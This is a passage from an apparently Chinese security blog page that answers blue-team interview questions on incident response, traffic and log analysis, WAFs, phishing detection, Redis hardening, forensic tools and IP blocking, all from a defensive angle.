系统来监测系统内部和外部的攻击行为。</p></li><li><p>监控日志：对系统中产生的日志进行定期审计和监控，及时发现异常情况并采取相应的措施。</p></li><li><p>及时修补漏洞：定期检查和更新系统、应用程序和第三方库的版本，以修复已知的漏洞。</p></li></ol><h2 id="如何分析被代理出来的数据流"><a href="#如何分析被代理出来的数据流" class="headerlink" title="如何分析被代理出来的数据流"></a>如何分析被代理出来的数据流</h2><p>被代理出来的数据流通常是由代理服务器拦截并转发的，可以借助代理工具（如 Burp Suite）等工具来对数据流进行分析。以下是一些可能的分析方法：</p><ol><li><p>拦截和重放请求：在代理工具中，我们可以通过拦截请求，并对其做出修改，然后再次发送请求到目标服务器上，从而观察应用程序如何响应这些请求。</p></li><li><p>查看请求和响应头信息：在代理工具中，我们可以查看 HTTP 请求和响应头信息，包括 cookies、User-Agent 等，以了解应用程序的行为。</p></li><li><p>分析 HTTP 响应体：代理工具能够捕获 HTTP 响应体，并显示在工具界面中，我们可以查看应用程序返回的 HTML、JavaScript、CSS、图片等内容，以便了解应用程序的结构和行为。</p></li><li><p>查找敏感信息：代理工具可以对所有的 HTTP 流量进行记录和分析，我们可以通过搜索敏感信息来查找密码、凭据等敏感信息是否泄露。</p></li><li><p>使用插件进行分析：代理工具通常具有各种插件，例如 XSS 扫描器、SQL 注入扫描器、漏洞扫描器等，可以使用这些插件来检测应用程序中的漏洞和安全风险。</p></li></ol><p>需要注意的是，在进行数据流分析时，必须遵守法律和道德规范，不得盗取或滥用他人信息。同时，对于代理工具捕获的敏感信息，一定要妥善保护，避免泄露给未授权的人员。</p><h2 id="查看-windows-进程的方法有哪些"><a href="#查看-windows-进程的方法有哪些" class="headerlink" title="查看 windows 进程的方法有哪些"></a>查看 windows 进程的方法有哪些</h2><p>以下是查看 Windows 进程的几种方法：</p><ol><li><p>任务管理器：可以通过打开任务管理器来查看当前正在运行的进程。在 Windows 10 中，可以使用快捷键 Ctrl + Shift + Esc 来打开任务管理器；在其他版本的 Windows 中，可以使用 Ctrl + Alt + Delete 快捷键，然后选择“任务管理器”来打开。</p></li><li><p>命令行工具：可以使用命令行工具（如 cmd 或 PowerShell）来查看进程。在命令行中输入“tasklist”命令，即可列出当前正在运行的所有进程及其相关信息。</p></li><li><p>系统资源监视器：系统资源监视器是一个 Windows 内置的性能监控工具，可以查看系统的 CPU 使用率、内存占用率、磁盘和网络活动等信息。同时，它还提供了一个进程列表，可以显示每个进程的 CPU 使用率、内存占用情况等详细信息。</p></li><li><p>第三方工具：除了 Windows 自带的工具外，还有许多第三方工具可以用来查看进程，如 Process Explorer、Process Hacker 等。这些工具通常提供更加详细的进程信息，并允许用户对进程进行调试和管理。</p></li></ol><p>无论使用哪种方法，对于一些可疑的进程，我们应该及时采取相应的措施，例如杀死进程、禁止其自启动等。同时，我们还应该注意保护系统安全，避免恶意进程的入侵和攻击。</p><h2 id="如何查看进程对应的程序位置"><a href="#如何查看进程对应的程序位置" class="headerlink" title="如何查看进程对应的程序位置"></a>如何查看进程对应的程序位置</h2><p>在 Windows 操作系统中，可以通过以下几种方法查看进程对应的程序位置：</p><ol><li><p>使用任务管理器：打开任务管理器，选择“详细信息”选项卡，右键单击需要查看程序位置的进程，选择“打开文件位置”。</p></li><li><p>使用资源监视器：在资源监视器中，选择“CPU”选项卡，找到需要查看程序位置的进程，在右侧面板中选择该进程并右键单击，选择“属性”菜单，即可查看程序位置。</p></li><li><p>使用命令行工具：打开命令提示符或者 PowerShell，输入以下命令：</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where &quot;processid=[进程 ID]&quot; get ExecutablePath</span><br></pre></td></tr></table></figure><p>其中，[进程 ID]是需要查看的进程的 PID（进程标识符）。</p><ol><li>使用第三方工具：许多第三方工具（如 Process Explorer）提供了更加详细的进程信息，并可以帮助用户快速定位程序位置。</li></ol><p>无论使用哪种方法，我们都可以在查找到程序位置后，根据需要采取相应的措施。例如，为了解决某些问题，我们可能需要删除、备份或更新程序文件；而在排查安全问题时，我们可能需要检查程序文件是否被篡改或者感染了病毒。</p><h2 id="WAF-产品有哪些分类，是如何拦截攻击的"><a href="#WAF-产品有哪些分类，是如何拦截攻击的" class="headerlink" title="WAF 产品有哪些分类，是如何拦截攻击的"></a>WAF 产品有哪些分类，是如何拦截攻击的</h2><p>WAF（Web 应用程序防火墙）产品通常可以分为以下几种分类：</p><ol><li><p>基于签名的 WAF：基于签名的 WAF 通过检测请求中是否包含已知漏洞的特征，来拦截攻击。这种类型的 WAF 可以快速识别和阻止已知的攻击方式。</p></li><li><p>基于行为的 WAF：基于行为的 WAF 使用机器学习、人工智能等技术来分析请求的行为模式，并判断其是否具有攻击性。这种类型的 WAF 能够较好地识别未知攻击。</p></li><li><p>综合型 WAF：综合型 WAF 结合了基于签名和基于行为两种技术，能够同时检测已知攻击和未知攻击，提供更加全面的保护。</p></li></ol><p>WAF 产品一般通过拦截攻击请求来保护 Web 应用程序。具体的拦截方式包括：</p><ol><li><p>黑名单过滤：根据已知的攻击方式，设置黑名单规则，对符合规则的请求进行拦截。</p></li><li><p>白名单过滤：对请求进行白名单过滤，只允许符合规则的请求通过。</p></li><li><p>存储过程注入防护：对 SQL 注入进行防护。WAF 可以检测并拦截具有攻击意图的 SQL 语句，并对其进行相应的修复和防护。</p></li><li><p>跨站脚本（XSS）防护：WAF 可以检测并过滤包含恶意 JavaScript 代码的请求，并防止 XSS 攻击。</p></li><li><p>防止文件上传漏洞：WAF 可以检测并拦截包含恶意文件的请求，从而避免文件上传漏洞导致的攻击。</p></li></ol><p>总之，WAF 产品可以有效地保护 Web 应用程序免受各种类型的攻击。但是需要注意的是，WAF 并不是万能的，仍然需要结合其他安全措施来保障 Web 应用程序的安全。</p><h2 id="你有用过态势感知的产品吗？"><a href="#你有用过态势感知的产品吗？" class="headerlink" title="你有用过态势感知的产品吗？"></a>你有用过态势感知的产品吗？</h2><ol><li><p>360态势感知：由中国著名安全厂商360推出的产品，主要提供网络威胁查询、漏洞扫描、流量分析等功能，同时集成了各种安全情报和指标，可以为用户提供全面的安全态势分析和预警服务。</p></li><li><p>腾讯云安全大脑：由腾讯云推出的产品，利用 AI、机器学习等技术对攻击进行实时监测和分析，提供包括漏洞扫描、风险评估、异常检测等一系列安全服务。</p></li><li><p>云锁事件响应中心：由阿里云推出的产品，提供网络空间威胁和安全事件的监测、预警、应急响应等服务。该产品采用 AI 算法进行态势感知，并可以自动化响应安全事故。</p></li><li><p>北京赛迪态势感知系统：由北京赛迪安全科技股份有限公司开发的产品，支持网络威胁情报搜集、风险事件自动识别、威胁行为关联分析等功能，可为企业提供全生命周期的网络安全保护。</p></li><li><p>启明星辰安全态势感知：由启明星辰推出的产品，提供整体安全态势感知、针对性攻击检测、应急响应等功能，可帮助用户实现从被动防御到主动防御的转变。</p></li></ol><p>这些产品都采用了先进的机器学习和人工智能技术，可以自动化地分析和识别网络威胁，并及时发出预警或者采取应急措施。同时，这些产品还具备可视化的操作界面，用户可以通过简单的操作就可以了解整个系统的安全情况，并做出相应的决策。</p><h2 id="什么是跨域，JSONP-与-CORS"><a href="#什么是跨域，JSONP-与-CORS" class="headerlink" title="什么是跨域，JSONP 与 CORS"></a>什么是跨域，JSONP 与 CORS</h2><p>在 Web 开发中，跨域（Cross-Origin）指的是当一个 web 应用程序在访问另一个与其来源（协议、域名或端口号）不同的 web 应用程序时所发生的浏览器安全限制。这种限制可以防止非法的数据窃取和恶意代码的注入，从而保障了用户的信息安全。</p><p>为了解决跨域问题，Web 安全领域出现了两种常见的技术：JSONP 和 CORS。</p><ol><li><p>JSONP：JSONP（JSON with Padding）是一种跨域请求数据的方式，原理是通过在 HTML 页面上使用 script 标签加载远程 JSON 数据，并通过回调函数处理获取到的数据。这种方式可以绕过浏览器的同源策略，但只支持 GET 请求。</p></li><li><p>CORS：CORS（Cross-Origin Resource Sharing）是在服务器端设置允许跨域请求的机制。它通过在 HTTP 头信息中添加一些字段来告诉浏览器该服务器允许哪些域名的请求。CORS 可以支持各种类型的 HTTP 请求，并且比 JSONP 更加灵活和安全。</p></li></ol><p>总之，无论是 JSONP 还是 CORS，都是为了解决跨域问题而设计的技术。开发人员可以根据自己的需求来选择适合自己的方式，并结合安全考虑进行使用。同时，为了保护用户的信息安全，在使用跨域技术时，需要特别注意对传输数据的加密和防篡改措施。</p><h2 id="如何发现钓鱼邮件"><a href="#如何发现钓鱼邮件" class="headerlink" title="如何发现钓鱼邮件"></a>如何发现钓鱼邮件</h2><p>钓鱼邮件是一种常见的网络针对性攻击手段，通常通过电子邮件发送虚假信息诱骗受害者提供个人敏感信息或进行非法行为。以下是几种发现钓鱼邮件的方法：</p><ol><li><p>查看发件人地址：钓鱼邮件的发件人地址通常会伪装成合法、可信的机构或公司，但是如果您仔细查看发件人地址，就可能发现其不是该机构或公司真正的域名。</p></li><li><p>检查链接地址：钓鱼邮件中通常会包含可疑的链接，如果您将鼠标悬停在链接上，就可以看到链接的真实地址。如果该地址与邮件内容不符，就可能是钓鱼邮件。</p></li><li><p>注意邮件内容：钓鱼邮件通常会给人留下一种紧急、必须立即采取行动的感觉，从而诱骗用户点击链接或执行某些操作。因此，如果您收到这样的邮件，请仔细阅读邮件内容，并多加思考和确认。</p></li><li><p>尽量避免下载附件：钓鱼邮件通常会携带恶意附件，如果您无法确认邮件的真实性，最好不要下载或打开这些附件，以免被感染。</p></li><li><p>安装反钓鱼软件：有一些反钓鱼软件可以帮助用户检测和拦截钓鱼邮件，例如 Google 的 Password Alert 等。</p></li></ol><p>总之，发现钓鱼邮件需要多加警惕和注意，在收到可疑邮件时，应该仔细查看邮件内容和相关信息，并尽可能采取措施避免被钓鱼攻击。</p><h2 id="如何查看区分是扫描流量和手动流量"><a href="#如何查看区分是扫描流量和手动流量" class="headerlink" title="如何查看区分是扫描流量和手动流量"></a>如何查看区分是扫描流量和手动流量</h2><p>扫描流量和手动流量的区别在于其产生的方式和行为特征，因此可以通过以下几种方法来查看区分它们：</p><ol><li><p>查看流量来源：扫描流量通常是由自动化工具或蠕虫病毒等程序生成的，因此其源 IP 或者发起请求的主机通常不固定，而手动流量则来自人工操作的设备，其请求的 IP 地址和用户代理信息都会有所不同。</p></li><li><p>检测流量频率和规律：扫描流量通常会呈现出周期性、规律性的访问行为，例如连续大量的 TCP SYN 请求等。而手动流量则通常难以呈现出明显的规律和周期性。</p></li><li><p>观察流量的请求路径和参数：扫描流量通常是为了探测系统漏洞和弱点而产生的，它们通常会对一些已知的 URL 和参数进行大量的尝试，并使用一些特殊的 HTTP 头部信息。而手动流量则更加多样化，可能会包含更丰富的请求路径和参数。</p></li><li><p>分析流量的响应状态码和长度：扫描流量通常会通过检测返回的状态码和页面长度等信息来判断目标是否存在漏洞或弱点。手动流量则通常会具有更加正常的响应状态码和页面长度。</p></li></ol><p>总之，通过综合分析流量来源、访问规律、请求路径和参数以及响应状态码等特征，我们可以比较准确地区分扫描流量和手动流量，并采取相应的防御措施。</p><h2 id="遇到-exe-文件如何处理？"><a href="#遇到-exe-文件如何处理？" class="headerlink" title="遇到.exe 文件如何处理？"></a>遇到.exe 文件如何处理？</h2><p>.exe 文件是 Windows 上的可执行文件，通常包含应用程序或者安装程序等内容。如果您在电子邮件或者网络上收到了 .exe 文件，需要格外小心，因为它们可能包含病毒、恶意软件或者其他危险物品。以下是几种处理方法：</p><ol><li><p>不要直接运行：不要轻易双击或者打开未知来源的 .exe 文件，因为它们可能会启动恶意软件，并对您的系统造成损害。如果您必须要运行这些 .exe 文件，请先进行杀毒软件扫描和检测操作。</p></li><li><p>使用虚拟机：如果您需要测试某个 .exe 文件的行为和效果，可以考虑使用虚拟机。虚拟机可以将一个完整的操作系统运行在一个软件容器中，使得用户可以在其中安全地运行可疑的 .exe 文件，并且不会影响主机系统的安全性。</p></li><li><p>上传到在线扫描服务平台：一些在线杀毒软件平台，例如 VirusTotal 等，提供了在线扫描可疑文件的服务。如果您不确定一个 .exe 文件是否安全，可以上传到这些平台进行扫描，以获取更多的信息和建议。</p></li><li><p>将文件发送给安全专家：如果您无法确定 .exe 文件的安全性，可以将其发送给安全专家进行分析。安全专家可以根据其行为特征和结构等信息，对该文件进行深度分析，以确定是否存在潜在的安全威胁。</p></li></ol><p>总之，在处理未知来源的 .exe 文件时，需要注意谨慎并采取必要的安全措施，以确保您的系统不会被攻击或感染。如果您遇到可疑的 .exe 文件，请务必进行杀毒软件扫描，并尽可能获取更多的信息和建议。</p><h2 id="应急响应的排查思路？"><a href="#应急响应的排查思路？" class="headerlink" title="应急响应的排查思路？"></a>应急响应的排查思路？</h2><p>应急响应的排查思路主要包括以下几个方面：</p><ol><li><p>确认事件：首先需要了解事件的具体情况，包括发生的时间、影响范围、受影响的系统和服务等信息。同时还需要判断是否存在钓鱼邮件、病毒感染等情况，以确定是否存在网络安全事件。</p></li><li><p>收集证据：在确认安全事件后，需要及时收集相关证据，包括日志记录、网络流量、进程信息、文件系统状态等信息，并进行存档备份。这些证据可以为后续的分析提供依据。</p></li><li><p>分析数据：对收集到的证据进行分析，尤其是日志和网络流量等数据，可以帮助快速定位问题和确认是否存在攻击行为。在分析过程中，可以利用一些常见的工具，例如 Wireshark、Nmap、Sysinternals 等。</p></li><li><p>阻止攻击：在确认存在攻击行为后，需要立即采取措施，阻止攻击并保护现有系统。这些措施包括封锁网络、隔离受感染主机、关闭漏洞等。</p></li><li><p>制定应急计划：根据分析结果，制定相应的应急计划，确保系统能够迅速恢复正常的运行状态。应急计划应该包括恢复数据、修复漏洞、加强安全防御等方面。</p></li></ol><p>总之，应急响应排查思路需要遵循快速响应、收集证据、分析数据、阻止攻击和制定应急计划等原则，并且需要依靠专业的技能和工具来实现。在实际操作中，需要小心谨慎，同时保持高度警惕和敏锐性。</p><h2 id="普通的加固手段？"><a href="#普通的加固手段？" class="headerlink" title="普通的加固手段？"></a>普通的加固手段？</h2><p>普通的加固手段包括以下几种：</p><ol><li><p>更新补丁：定期更新操作系统、应用程序的补丁，修复已知的漏洞和安全问题。</p></li><li><p>强化口令策略：采用复杂、难以猜测的密码，并进行定期更换。同时可以启用账户锁定、多次失败尝试限制等功能，提高口令安全性。</p></li><li><p>加强身份验证：采用多因素身份验证技术，例如使用硬件令牌、生物特征等方式，确保只有授权用户才能访问系统。</p></li><li><p>安装防病毒软件：安装并及时更新防病毒软件，定期进行全盘扫描和实时监控，以便及时发现和处置潜在的恶意软件。</p></li><li><p>关闭不必要服务：关闭系统中不必要的服务和端口，降低攻击面，避免被利用。</p></li><li><p>限制访问权限：根据业务需要，设置合理的访问权限，对于未授权的用户或者设备进行限制，提高系统的安全性。</p></li><li><p>数据备份与恢复：定期备份重要数据，并将其存储在安全可靠的位置。在出现故障或事件时，能够快速恢复数据，避免数据丢失和系统停机。</p></li></ol><p>总之，以上这些普通的加固手段可以帮助提高系统的安全性和稳定性，并且也是网络安全基础建设的关键步骤。在实际操作中，需要根据具体情况和需求，结合其他安全措施来进行综合加固。同时需要注意及时更新和检查，以确保系统始终处于安全状态。</p><h2 id="redis未授权的条件，修复方式？"><a href="#redis未授权的条件，修复方式？" class="headerlink" title="redis未授权的条件，修复方式？"></a>redis未授权的条件，修复方式？</h2><p>Redis 未授权访问是指某些 Redis 实例的访问控制没有得到正确配置，导致攻击者可以通过不需要认证的方式直接连接该实例并进行操作。这可能会导致敏感数据泄露、系统被攻击等安全问题。</p><p>修复 Redis 未授权访问的方式包括以下几个步骤：</p><ol><li><p>确认是否存在未授权访问：通过检查日志和网络流量等信息，确认是否存在未授权访问的情况。</p></li><li><p>修改 Redis 配置文件：在 redis.config 配置文件中，找到 bind 参数并将其设置为 Redis 监听的 IP 地址。此外，还需要设置 requirepass 参数，并设置一个强密码来保护 Redis 数据库。</p></li><li><p>重新启动 Redis 服务：在修改完 Redis 配置文件后，需要重新启动 Redis 服务，以便使新的配置生效。</p></li><li><p>禁用 Redis 远程访问：如果您的 Redis 服务只在本地使用，则应禁用 Redis 的远程访问，以降低攻击面和提高安全性。</p></li><li><p>定期更新 Redis 和操作系统补丁：及时更新 Redis 和操作系统的安全补丁，以修复已知漏洞和提高系统安全性。</p></li></ol><p>总之，在修复 Redis 未授权访问时，我们需要先确认是否存在未授权访问的情况，然后按照上述步骤进行修复。为了保证系统安全，我们还需要经常检查 Redis 配置文件和操作系统状态，及时更新补丁，并定期进行安全审计和漏洞扫描等操作。</p><h2 id="被攻击后，日志文件以及木马文件被删除怎样排查"><a href="#被攻击后，日志文件以及木马文件被删除怎样排查" class="headerlink" title="被攻击后，日志文件以及木马文件被删除怎样排查"></a>被攻击后，日志文件以及木马文件被删除怎样排查</h2><p>被攻击后，日志文件和木马文件被删除会给排查工作带来很大的困难，但还是有一些方法可以尝试：</p><ol><li><p>查看系统备份：如果您的系统进行了定期备份，那么可以尝试从备份中恢复丢失的日志文件和木马文件。如果备份没有受到攻击，那么这种方式可能会非常有效。</p></li><li><p>恢复已删除文件：一些数据恢复软件，例如Recuva、EaseUS Data Recovery等，可以恢复已删除的文件。您可以尝试使用这些软件来恢复被删除的文件。</p></li><li><p>检查其他主机：如果您的系统被集成到网络中，可以检查其他主机是否有相同的攻击迹象和后门程序。对于攻击者来说，攻击多台主机通常需要更多的时间和资源，因此在其他主机上发现类似的攻击行为也许能够提供有用的信息。</p></li><li><p>分析系统快照：如果您的系统支持系统快照功能，例如 Windows 系统还原点，可以尝试回滚系统至之前的快照状态，并分析该状态下的日志信息和系统状态，以寻找攻击行为的证据。</p></li><li><p>日志审计：如果日志文件被删除，可以尝试通过其他渠道收集日志信息，并进行审计分析。例如，可以检查网络流量、系统性能、系统进程等信息，以确定是否存在异常行为。</p></li></ol><p>总之，在日志文件和木马文件被删除的情况下，需要采用其他方法来寻找攻击迹象和证据。同时，为了避免这种情况的发生，我们应该在系统中设置必要的日志轮转和备份策略，并加强安全防御工作，避免被攻击者入侵。</p><h2 id="安全设备报警"><a href="#安全设备报警" class="headerlink" title="安全设备报警"></a>安全设备报警</h2><p>安全设备报警是指安全设备（例如入侵检测系统、防火墙、安全加固等）监测到的与安全相关的事件或活动达到了预先设定的规则和阈值，触发了警报通知。以下是一些处理安全设备报警的方法：</p><ol><li><p>确认警告的真实性：首先需要确认收到的警报信息是否为真实的安全事件，需要对日志和其他相关信息进行分析和验证。如果发现确实存在安全问题，则需要立即采取适当措施。</p></li><li><p>优先级分类：不同类型的安全事件具有不同的严重程度和威胁级别，需要根据事件的类型、来源等因素进行分类和优先级排序，并采取相应的措施进行处理。</p></li><li><p>制定处理计划：根据事件情况和优先级，制定相应的处理计划和操作流程。这些计划可以包括隔离受感染主机、采取补救措施、收集证据等方面。</p></li><li><p>跟踪事件进展：在处理安全事件时，需要跟踪事件的进展和结果，并及时更新相关记录和文档。同时要保持与相关人员的沟通和协调，以便及时解决问题。</p></li><li><p>定期复查：定期审查和分析系统和设备的报警记录和日志，以及采取的应对措施和效果。这可以帮助发现系统中存在的风险和漏洞，并及时加以修复和优化。</p></li></ol><p>总之，在处理安全设备报警时，需要快速响应、分类优先、制定计划等步骤，以保障系统的安全性，并且需要持续地监测和优化安全防御策略。</p><h2 id="日志与流量分析"><a href="#日志与流量分析" class="headerlink" title="日志与流量分析"></a>日志与流量分析</h2><p>日志和流量分析是网络安全领域中常用的两种技术。它们都可以帮助安全人员更好地了解系统的状态，检测和预防威胁。</p><p>日志分析是指对服务器、应用程序等产生的日志进行收集、存储、分析和处理，以便了解系统的运行状况和发现异常事件。通过对日志数据的统计和分析，可以追踪用户活动、系统错误、安全事件等，以及发现潜在的风险和漏洞。比如，通过分析登录日志可以检测到恶意登录尝试；通过分析访问日志可以了解网站的被攻击情况。</p><p>流量分析是指对网络流量进行收集、存储、分析和处理，以便了解网络连接的状态，检测和预防网络攻击。通过对流量数据的统计和分析，可以追踪网络通信、检测威胁和漏洞，比如检测恶意流量、DDoS攻击等。流量分析通常需要使用专业的工具和技术，包括网络协议分析、流量捕获和分析软件等。</p><p>综上所述，日志和流量分析是网络安全中非常重要的技术，它们可以帮助安全人员发现和解决潜在的安全问题，并维护系统和网络的正常运行。</p><h2 id="服务器资源异常"><a href="#服务器资源异常" class="headerlink" title="服务器资源异常"></a>服务器资源异常</h2><ol><li><p>检查服务器负载情况：使用系统监视工具（如top、htop或glances等）来检查服务器的负载状况。如果负载过高，请考虑升级服务器资源或调整应用程序配置。</p></li><li><p>清理硬盘空间：如果硬盘空间不足，可以删除不必要的文件和日志，或者将它们移到其他存储设备上。</p></li><li><p>优化数据库：如果您的应用程序使用了数据库，可以尝试优化数据库以提高性能和减少资源使用。</p></li><li><p>减少并发连接数：如果您的应用程序支持并发连接，可以考虑限制同时连接的数量，从而减轻服务器压力。</p></li><li><p>升级服务器硬件：如果您的服务器硬件过时，升级服务器硬件可能是一个好选择。</p></li></ol><p>这里列出的是一些常见的解决方法，但具体应该根据您的问题和实际情况进行分析和处理。</p><h2 id="邮件钓鱼"><a href="#邮件钓鱼" class="headerlink" title="邮件钓鱼"></a>邮件钓鱼</h2><p>邮件钓鱼是一种利用欺骗手段获取用户敏感信息（如用户名和密码）的网络攻击。以下是一些防范邮件钓鱼的措施：</p><ol><li><p>仔细检查发件人和链接：在打开或回复任何邮件之前，请确保发件人地址是正确的，并且不要点击任何可疑的链接。</p></li><li><p>不要泄露敏感信息：请不要在电子邮件中提供敏感信息，例如您的用户名、密码或银行卡号码等。</p></li><li><p>使用邮件过滤器：许多电子邮件服务提供商都有垃圾邮件和恶意软件过滤器，可以帮助防止钓鱼邮件进入您的收件箱。</p></li><li><p>使用双因素身份验证：如果可能的话，请使用双因素身份验证来增强账户安全性。</p></li><li><p>教育员工：对于企业来说，教育员工如何识别和应对钓鱼邮件至关重要，这将有助于减少安全风险。</p></li></ol><p>总之，防范邮件钓鱼需要我们保持警惕，小心处理邮件，避免泄露敏感信息，使用合适的安全工具，加强安全意识培训。</p><h2 id="蜜罐系统"><a href="#蜜罐系统" class="headerlink" title="蜜罐系统"></a>蜜罐系统</h2><p>蜜罐系统是一种安全防御技术，它通过模拟真实系统和应用程序环境来诱导攻击者进行攻击，以便收集攻击者的行为信息并保护真实系统免受攻击。</p><p>蜜罐系统通常包括以下组件：</p><ol><li><p>虚拟机：虚拟机用于运行蜜罐操作系统和应用程序，并提供与真实系统类似的环境。</p></li><li><p>模拟应用程序：模拟应用程序模拟真实应用程序的功能，但同时也被设计成易受攻击的。</p></li><li><p>监听器：监听器负责记录攻击者的所有行为，例如攻击方式、攻击目标、攻击时间等。</p></li><li><p>分析器：分析器负责对监听器收集到的数据进行分析，并生成相关的报告。</p></li></ol><p>使用蜜罐系统可以帮助安全团队更好地了解攻击者的行为和策略。此外，当攻击发生时，蜜罐系统还可以吸引攻击者并分散他们的注意力，从而降低真实系统遭受攻击的风险。</p><p>但需要注意的是，使用蜜罐系统也存在一些风险，如攻击者可能会利用蜜罐系统来了解防御策略和安全漏洞，因此在使用蜜罐系统时需要谨慎评估其风险和收益。</p><h2 id="溯源反制手段"><a href="#溯源反制手段" class="headerlink" title="溯源反制手段"></a>溯源反制手段</h2><p>溯源反制手段是指在网络攻击发生后，对攻击来源进行追踪和分析，以便采取相应的反制措施。以下是一些常见的溯源反制手段：</p><ol><li><p>IP地址追踪：通过IP地址追踪可以确定攻击者的地理位置和ISP信息等，并且可以将这些信息提供给执法机构进行调查和追诉。</p></li><li><p>系统日志分析：系统日志记录了系统的所有活动信息，包括用户登录、访问权限、进程启动等。通过对系统日志的分析，可以了解攻击的时间、方式和攻击者可能留下的痕迹。</p></li><li><p>恶意软件分析：恶意软件通常会留下特定的标志或指令，这些标志或指令可以帮助分析人员了解攻击者的目的和策略。通过分析恶意软件，还可以发现其它潜在的安全威胁。</p></li><li><p>威胁情报分析：威胁情报分析可以帮助判断攻击者的目的和策略，并可以收集针对特定攻击的信息和反制策略。</p></li><li><p>电子邮件头分析：邮件头中包含了一些关于发送方和接收方的信息，例如IP地址、电子邮件客户端类型等。通过分析邮件头，可以确定攻击者的来源和行踪。</p></li></ol><p>总之，在进行溯源反制时，需要综合运用多种手段，从多个角度收集信息，并对这些信息进行深入分析，以便更好地了解攻击的情况，采取相应的反制措施。</p><h2 id="通过wireshark工具如何对流量进行溯源？"><a href="#通过wireshark工具如何对流量进行溯源？" class="headerlink" title="通过wireshark工具如何对流量进行溯源？"></a>通过wireshark工具如何对流量进行溯源？</h2><p>Wireshark是一个网络抓包工具，可以捕获和分析网络流量。以下是使用Wireshark工具对流量进行溯源的步骤：</p><ol><li><p>打开Wireshark软件并开始捕获网络流量。</p></li><li><p>过滤出需要关注的数据包。例如，如果要寻找某个IP地址的流量，可以在Wireshark中使用过滤器“ip.addr &#x3D;&#x3D; [目标IP地址]”来过滤出相关数据包。</p></li><li><p>找到涉及目标IP地址的数据包，并分析它们。可以查看数据包的详细信息，例如源IP地址、目标IP地址、端口号、协议类型等，以获取更多有关攻击者的信息。</p></li><li><p>根据数据包的来源IP地址和端口号，确定攻击者可能所在的网络或主机。可以通过WHOIS查询来了解更多信息，例如注册人姓名、电子邮件地址、电话号码等。</p></li><li><p>对数据包进行深入分析，以判断是否存在恶意活动。例如，检查数据包中传输的文件是否被感染，或者检查是否存在异常流量或频繁的连接尝试等。</p></li></ol><p>总之，通过Wireshark工具对流量进行溯源需要我们认真观察和分析数据包，尤其需要关注目标IP地址和涉及该地址的数据包，从多个角度收集信息，以便更好地了解攻击的情况，并采取相应的反制措施。</p><h2 id="如何定位到攻击-IP"><a href="#如何定位到攻击-IP" class="headerlink" title="如何定位到攻击 IP"></a>如何定位到攻击 IP</h2><p>为了定位到攻击IP，您可以跟随以下步骤：</p><ol><li><p>收集攻击事件的日志信息：首先，您需要获取与攻击相关的日志信息。这可能包括服务器、网关或IDS&#x2F;IPS设备等的日志文件。检查这些日志文件以查看攻击事件的详细信息。</p></li><li><p>确定攻击类型：根据攻击日志信息，确定攻击类型，例如DDoS攻击、SQL注入等。</p></li><li><p>使用网络嗅探工具：您可以使用像Wireshark这样的网络嗅探工具来捕获和分析网络流量。通过分析数据包，您可以确定攻<br>击流量的来源IP地址。</p></li><li><p>分析网络流量：对分析出的流量进行深入分析，查找异常流量特征。例如，您可以检查是否有大量流量来自同一IP地址或者是否有许多连接尝试来自相同的IP地址。</p></li><li><p>使用WHOIS查询：使用WHOIS查询可以帮助您查找IP地址归属地和注册人信息，以便更好地了解攻击者的位置和身份。</p></li><li><p>采取反制措施：最后，根据收集到的信息，确定攻击者的IP地址，并采取相应的反制措施，例如在防火墙中添加黑名单规则或使用安全设备来抵御攻击。</p></li></ol><p>需要注意的是，攻击者可能会使用虚假或伪造的IP地址来掩盖自己的身份和位置。在这种情况下，您可能需要使用其他技术手段来确定攻击者的真实来源。</p><h2 id="常用取证工具有哪些"><a href="#常用取证工具有哪些" class="headerlink" title="常用取证工具有哪些"></a>常用取证工具有哪些</h2><p>常用的取证工具包括：</p><ol><li><p>FTK（Forensic Toolkit）：一款全面的数字取证工具，可以获取、分析和报告各种数字数据。</p></li><li><p>EnCase：一款商业化的取证工具，广泛应用于执法机构和企业中。</p></li><li><p>X-Ways Forensics：一款功能强大的取证工具，可以解析多种文件系统和磁盘映像格式。</p></li><li><p>Autopsy：一个免费的开源取证工具，可以帮助用户快速识别证据并生成相应的报告。</p></li><li><p>Volatility Framework：一个基于内存取证的工具，可以提取运行中操作系统的进程、内核模块和网络连接等信息。</p></li><li><p>Wireshark：一款流量分析工具，可以捕获和分析网络数据包，并对其进行深入的分析。</p></li><li><p>Forensic Browser for SQLite：一款专门用于SQLite数据库的取证工具，可以查看、搜索和导出SQLite数据库中的数据。</p></li></ol><p>这些工具都有各自的优缺点和适用场景，根据实际需求选择合适的工具很重要。</p><h2 id="溯源的常见手法？"><a href="#溯源的常见手法？" class="headerlink" title="溯源的常见手法？"></a>溯源的常见手法？</h2><p>数字溯源是指通过分析数字证据，追踪和还原事件或活动的发生过程和轨迹。常见的溯源手法包括：</p><ol><li><p>网络日志溯源：根据网络日志记录来追踪网络活动的来源、目的地和传输路径。</p></li><li><p>数据库溯源：通过对数据库中数据修改、删除和查询等操作的记录，还原出相关事件的发生过程。</p></li><li><p>软件代码溯源：通过对软件代码进行逆向分析，确定软件的功能、用途和开发者信息。</p></li><li><p>文件元数据溯源：通过分析文件元数据（如文件创建时间、修改时间和所有者信息等），确定文件的来源和修改历史。</p></li><li><p>实体设备溯源：通过物理取证、数据提取和分析，还原数字设备被使用的历史记录和活动轨迹。</p></li></ol><p>综合运用这些溯源手法，可以有效地追踪和还原数字活动的整个过程，为刑事侦查、安全审计和企业风险管理等领域提供重要支持。但值得注意的是，数字溯源需要遵守严格的法律程序和规范，并尊重用户的隐私权和数据保护要求。</p><h2 id="如何封ip"><a href="#如何封ip" class="headerlink" title="如何封ip"></a>如何封ip</h2><p>封禁IP是指通过防火墙或其他网络安全设备，阻止某个IP地址对网络资源进行访问。封禁IP可以有效地防止恶意攻击、网络滥用和非法访问等问题，保护网络安全。</p><p>以下是封禁IP的一般步骤：</p><ol><li><p>登录防火墙或其他网络安全设备，进入配置界面。</p></li><li><p>找到IP过滤规则或黑名单功能，添加封禁规则。</p></li><li><p>在规则中填写要封禁的IP地址或IP地址段。</p></li><li><p>设置封禁的时间或持续期限（如永久封禁或暂时封禁）。</p></li><li><p>保存设置并生效，检查是否成功封禁目标IP。</p></li></ol><p>需要注意的是，在封禁IP之前，应该确认被封禁的IP确实存在安全问题，并遵守相应的法律和政策规定，以免误伤合法用户和引发纠纷。同时，应该及时监控封禁效果，并在必要的情况下进行调整和解除封禁。</p><h2 id="sql注入产生的原因是什么"><a href="#sql注入产生的原因是什么" class="headerlink" 